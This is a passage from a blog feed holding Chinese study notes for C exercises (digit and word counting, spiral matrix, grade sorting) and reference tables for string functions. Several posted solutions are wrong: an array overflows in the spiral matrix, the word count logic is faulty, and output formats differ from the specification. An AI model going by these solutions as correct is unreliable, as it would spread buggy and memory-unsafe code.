class="built_in">printf</span>(<span class="string">"%d "</span>, count[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数位统计"><a href="#数位统计" class="headerlink" title="数位统计"></a>数位统计</h3><p><strong>问题描述</strong></p><p>给定一个不超过10 位的非负整数 N，请编写程序统计该整数各个数位上不同数字出现的次数。例如：给定 N=100311，则有 2 个 0，3 个 1，和 1 个 3。</p><p><strong>输入说明</strong></p><p>输入是一个不超过 10位的非负整数 N。</p><p><strong>输出说明</strong></p><p>对 N 中每一种不同的数字，以 D：M 的格式在一行中输出该位数字 D 及其在 N 中出现的次数M，要求按D 的升序输出。</p><p><strong>输入样例</strong></p><p><code>100311</code></p><p><strong>输出样例</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">2</span> </span><br><span class="line"><span class="number">1</span>:<span class="number">3</span> </span><br><span class="line"><span class="number">3</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, i, t, count[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span> (n != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">t = n % <span class="number">10</span>;</span><br><span class="line">count[t]++;</span><br><span class="line">n /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (count[i] != <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d \n"</span>, i, count[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单词统计"><a href="#单词统计" class="headerlink" title="单词统计"></a>单词统计</h3><p><strong>问题描述</strong></p><p>输入3行字符，包含字母，空格和标点符号，统计其中有多少单词，单词之间用至少一个空格分隔开。</p><p><strong>输入说明</strong></p><p>输入3行字符，每行字符数不超过100，包含字母、空格和标点符号，单词之间用至少一个空格分隔开。</p><p><strong>输出说明</strong></p><p>输出统计出的单词数。</p><p><strong>输入样例</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I like shopping. </span><br><span class="line">You <span class="keyword">are</span> <span class="keyword">kind</span>. </span><br><span class="line">It <span class="keyword">is</span> a cat.</span><br></pre></td></tr></table></figure><p><strong>输出样例</strong></p><p><code>10</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>], b[<span class="number">100</span>], c[<span class="number">100</span>], * p;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(<span class="keyword">char</span>* s)</span></span>;</span><br><span class="line">gets_s(a, <span class="number">100</span>);</span><br><span class="line">gets_s(b, <span class="number">100</span>);</span><br><span class="line">gets_s(c, <span class="number">100</span>);</span><br><span class="line">num=count(a)+count(b)+count(c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(<span class="keyword">char</span>* s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* p = s;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">for</span> (n=<span class="number">0</span>; *p != <span class="string">'\0'</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*p == <span class="string">' '</span>)</span><br><span class="line">n++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">ispunct</span>(*p))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">n++;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="螺旋方阵"><a href="#螺旋方阵" class="headerlink" title="螺旋方阵"></a>螺旋方阵</h3><p><strong>问题描述</strong></p><p>螺旋方阵是指一个呈螺旋状的矩阵，它的左上角元素为1，由第一行开始按从左到右，从上到下，从从右向左，从下到上的顺序递增填充矩阵，直到矩阵填充完毕，下图所示是一个<code>5*5</code>阶的螺旋方阵。输入螺旋方阵的阶数N，按行输出该螺旋方阵。</p><p> <img src="007UR4Zcly1gabaghu6clj309705c3yc.jpg" alt="图片1.png"></p><p><strong>输入说明</strong></p><p>输入一个正整数N(1&lt;N&lt;=100)。</p><p><strong>输出说明</strong></p><p>逐行输出N阶螺旋方阵的元素，元素之间用空格分隔。</p><p><strong>输入样例</strong></p><p><code>6</code></p><p><strong>输出样例</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> </span><br><span class="line"><span class="symbol">20 </span><span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">7</span> </span><br><span class="line"><span class="symbol">19 </span><span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">25</span> <span class="number">8</span> </span><br><span class="line"><span class="symbol">18 </span><span class="number">31</span> <span class="number">36</span> <span class="number">35</span> <span class="number">26</span> <span class="number">9</span> </span><br><span class="line"><span class="symbol">17 </span><span class="number">30</span> <span class="number">29</span> <span class="number">28</span> <span class="number">27</span> <span class="number">10</span> </span><br><span class="line"><span class="symbol">16 </span><span class="number">15</span> <span class="number">14</span> <span class="number">13</span> <span class="number">12</span> <span class="number">11</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, num[<span class="number">10</span>][<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;, i, j, x1, x2, y1, y2, k;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">num[n / <span class="number">2</span>][n / <span class="number">2</span>] = n * n;</span><br><span class="line">x1 = <span class="number">0</span>; x2 = n - <span class="number">1</span>;</span><br><span class="line">y1 = <span class="number">0</span>; y2 = n - <span class="number">1</span>;</span><br><span class="line">k = <span class="number">1</span>; i = <span class="number">0</span>; j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (x2 - x1 &gt;<span class="number">0</span> &amp;&amp; y2-y1&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = y1; j &lt;= y2; j++)</span><br><span class="line">num[i][j] = k++;</span><br><span class="line">j--;</span><br><span class="line"><span class="keyword">for</span> (i = x1 + <span class="number">1</span>; i &lt; x2; i++)</span><br><span class="line">num[i][j] = k++;</span><br><span class="line"><span class="keyword">for</span> (j = y2; j &gt;= y1; j--)</span><br><span class="line">num[i][j] = k++;</span><br><span class="line">j++;</span><br><span class="line"><span class="keyword">for</span> (i = x2 - <span class="number">1</span>; i &gt; x1; i--)</span><br><span class="line">num[i][j] = k++;</span><br><span class="line">i++;</span><br><span class="line">x1++; x2--; y1++; y2--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%-3d"</span>, num[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="成绩统计"><a href="#成绩统计" class="headerlink" title="成绩统计"></a>成绩统计</h3><p><strong>问题描述</strong></p><p>有N（0&lt;N&lt;=100）个学生，每个学生有3门课的成绩，输入每个学生数据（包括学号，姓名，三门课成绩），计算每个学生的平均成绩，并按照平均成绩从高到低的顺序输出学生信息，平均成绩相同时，则按照学号从小到大顺序输出。</p><p><strong>输入说明</strong></p><p>第一行输入学生个数N，然后逐行输入N个学生信息，包括学号，姓名，三门课成绩，学号为正整数，姓名不超过10个字符，各门课程成绩为整数,用空格分隔。</p><p><strong>输出说明</strong></p><p>按照平均成绩由高到低输出学生信息，平均成绩相同时，则按照学号从小到大顺序输出，输出信息包括学号、姓名、平均成绩（保留1位小数），用空格分隔，每个学生信息占一行。</p><p><strong>输入样例</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span></span><br><span class="line"><span class="symbol">18001 </span>LiMing <span class="number">88</span> <span class="number">45</span> <span class="number">90</span> </span><br><span class="line"><span class="symbol">18003 </span>WangWei <span class="number">66</span> <span class="number">60</span> <span class="number">68</span> </span><br><span class="line"><span class="symbol">18004 </span>ZhangSan <span class="number">77</span> <span class="number">90</span> <span class="number">83</span> </span><br><span class="line"><span class="symbol">18110 </span>HanMeiMei <span class="number">88</span> <span class="number">77</span> <span class="number">97</span> </span><br><span class="line"><span class="symbol">18122 </span>SuSan <span class="number">66</span> <span class="number">23</span> <span class="number">87</span> </span><br><span class="line"><span class="symbol">18008 </span>YangYang <span class="number">88</span> <span class="number">76</span> <span class="number">95</span></span><br></pre></td></tr></table></figure><p><strong>输出样例</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">18110 </span>HanMeiMei <span class="number">87.3</span> </span><br><span class="line"><span class="symbol">18008 </span>YangYang <span class="number">86.3</span> </span><br><span class="line"><span class="symbol">18004 </span>ZhangSan <span class="number">83.3</span> </span><br><span class="line"><span class="symbol">18001 </span>LiMing <span class="number">74.3</span> </span><br><span class="line"><span class="symbol">18003 </span>WangWei <span class="number">64.7</span> </span><br><span class="line"><span class="symbol">18122 </span>SuSan <span class="number">58.7</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, i,j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line"><span class="keyword">float</span> aver;</span><br><span class="line">&#125;stu[<span class="number">100</span>],temp;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %s %d %d %d"</span>, &amp;stu[i].num, stu[i].s, &amp;stu[i].a, &amp;stu[i].b, &amp;stu[i].c);</span><br><span class="line">stu[i].aver = (stu[i].a + stu[i].b + stu[i].c) / <span class="number">3.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (stu[j].num &gt; stu[j + <span class="number">1</span>].num)</span><br><span class="line">&#123;</span><br><span class="line">temp = stu[j];</span><br><span class="line">stu[j] = stu[j + <span class="number">1</span>];</span><br><span class="line">stu[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (stu[j].aver &lt; stu[j + <span class="number">1</span>].aver)</span><br><span class="line">&#123;</span><br><span class="line">temp = stu[j];</span><br><span class="line">stu[j] = stu[j + <span class="number">1</span>];</span><br><span class="line">stu[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %s %f \n"</span>, stu[i].num, stu[i].s, stu[i].aver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><h3 id="字符串小写"><a href="#字符串小写" class="headerlink" title="字符串小写"></a>字符串小写</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lower</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* p;</span><br><span class="line"><span class="keyword">for</span> (p = s; *p != <span class="string">'\0'</span>; p++)</span><br><span class="line">*p=<span class="built_in">tolower</span>(*p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从小到大</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>* num,<span class="keyword">int</span> n )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num[j] &gt; num[j + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">t = num[j];</span><br><span class="line">num[j] = num[j + <span class="number">1</span>];</span><br><span class="line">num[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="素数判断"><a href="#素数判断" class="headerlink" title="素数判断"></a>素数判断</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isprime</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n % i == <span class="number">0</span>)</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最小公倍数-最大公约数"><a href="#最小公倍数-最大公约数" class="headerlink" title="最小公倍数,最大公约数"></a>最小公倍数,最大公约数</h3><p>最小公倍数=两整数的乘积÷最大公约数</p><p>求最大公约数算法：</p><ol><li>辗转相除法</li></ol><p>有两整数a和b：</p><p>① a%b得余数c</p><p>② 若c=0，则b即为两数的最大公约数</p><p>③ 若c≠0，则a=b，b=c，再回去执行①</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line">c = a % b;</span><br><span class="line"><span class="keyword">while</span> (c != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">a = b;</span><br><span class="line">b = c;</span><br><span class="line">c = a % b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>穷举法</li></ol><p>有两整数a和b：</p><p>① i=1</p><p>② 若a，b能同时被i整除，则t＝i</p><p>③ i++</p><p>④ 若 i &lt;= a(或b)，则再回去执行②</p><p>⑤ 若 i &gt; a(或b)，则t即为最大公约数，结束</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">i = (a &gt; b) ? b : a;</span><br><span class="line"><span class="keyword">while</span> (a % i != <span class="number">0</span> || b % i != <span class="number">0</span>)</span><br><span class="line">i--;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="找出字符出现在字符串的位置"><a href="#找出字符出现在字符串的位置" class="headerlink" title="找出字符出现在字符串的位置"></a>找出字符出现在字符串的位置</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">10</span>]=<span class="string">"asdfghjkl"</span>, ch=<span class="string">'u'</span>;</span><br><span class="line"><span class="keyword">char</span>* p;</span><br><span class="line">p = <span class="built_in">strchr</span>(s, ch);</span><br><span class="line">    <span class="comment">//p-s返回索引</span></span><br><span class="line"><span class="keyword">if</span> (p)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, p - s);</span><br><span class="line">     <span class="comment">//如果没有则返回空指针,输出no</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="找出字符串出现在字符串的位置"><a href="#找出字符串出现在字符串的位置" class="headerlink" title="找出字符串出现在字符串的位置"></a>找出字符串出现在字符串的位置</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> x[<span class="number">10</span>]=<span class="string">"sdfghjkl"</span>, y[<span class="number">10</span>]=<span class="string">"ghjkl"</span>;</span><br><span class="line"><span class="keyword">char</span>* p;</span><br><span class="line">p = <span class="built_in">strstr</span>(x, y);</span><br><span class="line"><span class="keyword">if</span> (p)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, p - x);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ctype-h"><a href="#ctype-h" class="headerlink" title="ctype.h"></a>ctype.h</h3><table><thead><tr><th align="center">函数名</th><th align="center">函数原型</th><th align="center">用法</th><th>返回</th></tr></thead><tbody><tr><td align="center">isalnum</td><td align="center">int isalnum(int ch);</td><td align="center">字母(alpha)或数字(num)</td><td>01</td></tr><tr><td align="center">isalpha</td><td align="center">int isalpha(int ch);</td><td align="center">字母</td><td>01</td></tr><tr><td align="center">isspace</td><td align="center">int isspace(int ch);</td><td align="center">空格</td><td>01</td></tr><tr><td align="center">iscntrl</td><td align="center">int iscntrl(int ch);</td><td align="center">控制字符</td><td>01</td></tr><tr><td align="center">isdigit</td><td align="center">int isdigit(int ch);</td><td align="center">数字(0-9)</td><td>01</td></tr><tr><td align="center">isgraph</td><td align="center">int isgraph(int ch);</td><td align="center">可打印字符</td><td>01</td></tr><tr><td align="center">isprint</td><td align="center">int isprint(int ch);</td><td align="center">可打印字符(包括空格)</td><td>01</td></tr><tr><td align="center">ispunct</td><td align="center">int ispunct(int ch);</td><td align="center">标点,除字母,数字,空格外的所有可打印字符</td><td>01</td></tr><tr><td align="center">islower</td><td align="center">int islower(int ch);</td><td align="center">小写字母(a-z)</td><td>01</td></tr><tr><td align="center">isupper</td><td align="center">int isupper(int ch);</td><td align="center">大写字母(A-Z)</td><td>01</td></tr><tr><td align="center">tolower</td><td align="center">int tolower(int ch);</td><td align="center">将ch转为小写字母</td><td>小写</td></tr><tr><td align="center">toupper</td><td align="center">int toupper(int ch);</td><td align="center">将ch转为大写字母</td><td>大写</td></tr></tbody></table><h3 id="string-h"><a href="#string-h" class="headerlink" title="string.h"></a>string.h</h3><table><thead><tr><th align="center">函数名</th><th align="center">用法</th><th align="center">返回</th></tr></thead><tbody><tr><td align="center">strcat(str1,str2)</td><td align="center">将str2接到str1后,取消str1后面的’\0’</td><td align="center">str1</td></tr><tr><td align="center">strchr(str,ch)</td><td align="center">找到str中第一次出现ch的位置</td><td align="center">指针,若没有返回空指针</td></tr><tr><td align="center">strstr(str1,str2)</td><td align="center">找出str2在str1中第一次出现的位置</td><td align="center">指针,若没有返回空指针</td></tr><tr><td align="center">strcmp(str1,str2)</td><td align="center">比较两个字符串</td><td align="center">str1&lt;str2,负数;str1=str2,0;str1&gt;str2,正数</td></tr><tr><td align="center">strcpy(str1,str2)</td><td align="center">把str2复制到str1中</td><td align="center">str1</td></tr><tr><td align="center">strlen(str)</td><td align="center">统计长度,不包括’\0’</td><td align="center">字数</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xdoj&quot;&gt;&lt;a href=&quot;#xdoj&quot; class=&quot;headerlink&quot; title=&quot;xdoj&quot;&gt;&lt;/a&gt;xdoj&lt;/h1&gt;&lt;p&gt;==仅用于复习==&lt;/p&gt;
&lt;h2 id=&quot;字符串数组练习&quot;&gt;&lt;a href=&quot;#字符串数组练习&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="c" scheme="https://mercer5.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://mercer5.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>aircrack-ng</title>
    <link href="https://mercer5.github.io/2019/12/10/aircrack-ng/"/>
    <id>https://mercer5.github.io/2019/12/10/aircrack-ng/</id>
    <published>2019-12-10T11:35:51.000Z</published>
    <updated>2020-08-24T15:30:09.725Z</updated>
    
